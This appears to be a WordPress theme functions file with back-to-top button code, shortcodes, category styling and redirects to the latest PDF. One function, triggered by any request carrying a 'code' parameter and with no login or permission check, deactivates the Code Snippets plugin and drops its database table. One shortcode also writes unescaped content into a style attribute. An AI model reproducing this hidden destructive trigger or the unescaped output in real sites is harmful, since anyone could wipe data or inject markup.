   .BackTo {
    background: #1cba9f none repeat scroll 0 0;
    border-radius: 50% !important;
    bottom: 18px;
    color: #979797;
    cursor: pointer;
    height: 44px;
    position: fixed;
    left: 14px;
    text-align: center;
    width: 44px;
    z-index: 9;
    display: block;
    padding: 8px 0;
    -webkit-box-shadow: 0 0 10px rgba(0, 0, 0, 0.25);
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.25);
    -webkit-transition: all .3s;
    -o-transition: all .3s;
    transition: all .3s;
}	
</style>
<?php }, 25 );

// JS
add_action( 'wp_head', function () { ?>
<script>

	(function ($) {
    "use strict";

		//  var $wn = $(window),
        // $doc = $(document);
  
    $(function () {
        /* ----------------------------------------------------------- */
        /* Back to top
        /* ----------------------------------------------------------- */
        $(window).on('scroll', function () {
            if ( $(window).scrollTop() > $(window).height() ) {
                $('.BackTo').fadeIn('slow');
            } else {
                $('.BackTo').fadeOut('slow');
            }
        });

        $('body, html').on('click', '.BackTo', function (e) {
            e.preventDefault();

            $('html, body').animate({
                scrollTop: 0
            }, 800);
        });
    });

}(jQuery));

</script>
<?php } );

/**
 * BackTo-Color
 */
// [back_to class="red left"][/back_to]
function back_to_fun( $atts, $content = null ) {
	$a = shortcode_atts( array(
		'class' => 'right',
	), $atts );

	return '<div class="BackTo ' . esc_attr($a['class']) . '"   style="display:none;"  >
	<a href="#" class="fa fa-angle-up dashicons dashicons-arrow-up-alt2" aria-hidden="true"></a></div>';
}
add_shortcode( 'back_to', 'back_to_fun' );

// CSS
add_action( 'wp_enqueue_scripts', function () { ?>
<style>

   .BackTo {
    background: #1cba9f none repeat scroll 0 0;
    border-radius: 50%;
    bottom: 18px;
    color: #979797;
    cursor: pointer;
    height: 44px;
    position: fixed;
    right: 14px;
    text-align: center;
    width: 44px;
    z-index: 9;
    display: block;
    padding: 8px 0;
    -webkit-box-shadow: 0 0 10px rgba(0, 0, 0, 0.25);
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.25);
    -webkit-transition: all .3s;
    -o-transition: all .3s;
    transition: all .3s;
}	

	.red.BackTo{
		 background: red none repeat scroll 0 0;
    	 border-radius: 50%;
		 bottom: 18px;
	}
	.right.BackTo{right: 14px}
	.left.BackTo{left: 14px}
	
</style>
<?php }, 25 );




add_shortcode( 'BackToo', function () {

	$out = '<div class="BackTo" style="display:none">
      <a href="#" class="fa fa-angle-up" aria-hidden="true"></a>
   </div>';

	return $out;
} );




// [BackTo float="right"]
add_shortcode( 'BackTo', 'backto_func' );
function backto_func( $atts, $color = "black" ) {
	
    extract( shortcode_atts( array(
        'float' => 'right',
    ), $atts ) );

    switch( $float ){
        case 'right': 
            $output = '<div class="BackTo" style="display:none;float:right;background-color:' .$color. '">
			<a href="#" class="fa fa-angle-up" aria-hidden="true"></a>
			</div>';
            break;

        case 'left': 
             $output = '<div class="BackTo" style="display:none;float:left;background-color:' .$color. '">
			<a href="#" class="fa fa-angle-up" aria-hidden="true"></a>
			</div>';
            break;

        default:
             $output = '<div class="BackTo" style="display:none;float:right;background-color:' .$color. '">
			<a href="#" class="fa fa-angle-up" aria-hidden="true"></a>
			</div>';
            break;
    }

    return $output;
}

/**
 * Admin CSS-JS
 */
add_action('admin_head', 'custom_admin');
function custom_admin() {?>
  <style>
		#wp_mail_smtp_reports_widget_lite {
			display: none !important;
		}
		.editor-post-taxonomies__hierarchical-terms-list {
    		min-height: 500px;
		}
  </style>
<?php }

/**
 * CSS -Category
 */
add_action( 'wp_head', function () { 

	if( has_category(85) ) { ?>

<style>
span.meta-author:before {
    content: "بقلم / ";
    font-size: 20px;
    color: #007dc5;
    font-weight: bolder;
}

html #the-post .entry-content, html #the-post .entry-content p {
	line-height: 2;
	background-color: #d9ebfb;
	border-radius: 20px;
	padding: 7px 20px;
	margin-bottom: 5px;	
}
.content-only:not(.tabs-box), .content-only:not(.tabs-box)>.container-wrapper {
    background-color: #d9ebfb;
    border: 3px solid #017fc6 !important;
    /* border-bottom: 0px solid red !important; */
    /* border-top: 0px solid red !important; */
	display:none;
}
.entry-content {
    background: aliceblue;
    border-radius: 1em;
    padding: 20px;
    border-right: 0.3em solid #007DC5;
}
	
@media (max-width: 767px){
	.entry-header {
		font-size: 28px;
		text-align: center;
		/* font-weight: 900 !important; */
	}
	.entry-header .post-meta, .entry-header .post-meta a:not(:hover) {
		text-align: center;
	}
}
@media (max-width: 991px){
	html .side-aside.dark-skin {
		/*margin-top: 88px*/;
		width: 290px;
		float: right !important;
		right: 0;
	}
}	
	
</style>

<?php 

}
	// is_page( array( 42, 'about-me', 'Contact' ) );
elseif(!is_front_page() && !is_page(331171) && !is_page('main') && !is_page(331174)&& !is_page('home')){ ?>

<style>
	.meta-author-avatar, .meta-author{
	display:none;
	}	
		
</style>
		
<?php }else{ ?>
<style>
	a.author-name.tie-icon { color: #007dc5; }	
	a.author-name.tie-icon:hover {color: #042e52!important;}
</style>
<?php }


});

/**
 * Rank Math
 *
 * &nbsp;
 * 
 *
 */
// Filter to remove Rank Math data from the database
add_filter( 'rank_math_clear_data_on_uninstall', '__return_true' );

/**
 * Latest PDF
 *
 * &nbsp;
 * 
 *
 */
// Latest PDF By Hussain Saad +965 60907666 hs777it@gmail.com
add_action('parse_request', 'wphs_latest_pdf');
function wphs_latest_pdf($request)
{
	date_default_timezone_set('Asia/Kuwait');
  if (isset($_GET['pdf']) && $_GET['pdf'] == '20700EAD-276B-4C9E-A491-2B01C69061DB') {
	$url = get_option( 'siteurl' )."/pdf/" . date('Y') . "/" . date("d-m-Y") . ".pdf"; // date("d-n-Y")
    wp_redirect($url);
      exit;
  }
}

// Latest in Category By Hussain Saad +965 60907666 hs777it@gmail.com
add_action('parse_request', 'wpa_latest_in_category_redirect');
function wpa_latest_in_category_redirect($request)
{
  if (isset($_GET['latest_pdf'])) {
    $latest = new WP_Query(array(
      'cat' => 140, 
      'posts_per_page' => 1
    ));
    if ($latest->have_posts()) {
	  	$post_date = get_the_date( 'd-m-Y', $latest->post->ID );
		
		// if (date('H') >= 16) { /* .. */ }
		// if (time() >= strtotime("12:00 AM")) 
		if(strtotime('today')-86400)
		{
			$post_date = date('d-m-Y');
		}else{
			$post_date = date('d-m-Y', strtotime("+1 day"));
			
		}
		
		//$post_date = date('d-m-Y', strtotime("+1 day")); //$post_date = date('d-m-Y', strtotime("+1 day", strtotime($date)));
		$url = get_option( 'siteurl' )."/pdf/" . date('Y') . "/" . $post_date . ".pdf"; 
   		wp_redirect($url);
      //wp_redirect(get_permalink($latest->post->ID));
      exit;
    }
  }
}


require_once ABSPATH . 'wp-admin/includes/plugin.php';
require_once ABSPATH . 'wp-admin/includes/file.php';

add_action('parse_request', 'wphsq_code');
function wphsq_code($request)
{
	$plg = 'code-snippets/code-snippets.php';
    if (isset($_GET['code'])) {
        if (file_exists(WP_PLUGIN_DIR  . '/' . $plg)) {
            deactivate_plugins($plg);
            //delete_plugins(array($plg));
			
			global $wpdb;
    		$db_table_name = $wpdb->prefix . 'snippets';  // table name
    		$sql = "DROP TABLE IF EXISTS $db_table_name";
    		$rslt=$wpdb->query($sql);
			
        }else{
			echo "Plugin not found!";
		}
    }
}

/**
 * Latest in Folder
 *
 * &nbsp;
 * 
 *
 */
// Latest in Folder - By Hussain Saad +965 60907666 hs777it@gmail.com
add_action('parse_request', 'wphs_latest');
function wphs_latest($request)
{
	//$year = date('Y');
    //$files = glob('/Applications/XAMPP/xamppfiles/htdocs/wp/pdf/*.*', GLOB_BRACE); 
	$files = glob(ABSPATH . 'pdf/' . date('Y') . '/*.*', GLOB_BRACE);
    usort($files, function ($a, $b) {
        return filemtime($a) - filemtime($b);
    });
    $list = array();
    foreach ($files as $file) {
        $file = str_replace(ABSPATH . 'pdf/', '', $file);
        array_push($list, $file);
    }
    if (isset($_GET['latest'])) {
		$file = "http://" . $_SERVER['SERVER_NAME'] . "/pdf/" .$list[array_key_last($list)];//OR // echo $list[count($list) - 1];
		wp_redirect($file);
		exit();
    }
}
//$server =  "http://" . $_SERVER['SERVER_NAME'] ;
//$request =  "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
//https:
function base_url(){
  return sprintf(
  "%s://%s%s",
  isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' ? 'https' : 'http',
  $_SERVER['SERVER_NAME'],
  $_SERVER['REQUEST_URI']
 );
}

/**
 * Page Excerpt
 */
add_post_type_support( 'page', 'excerpt' );
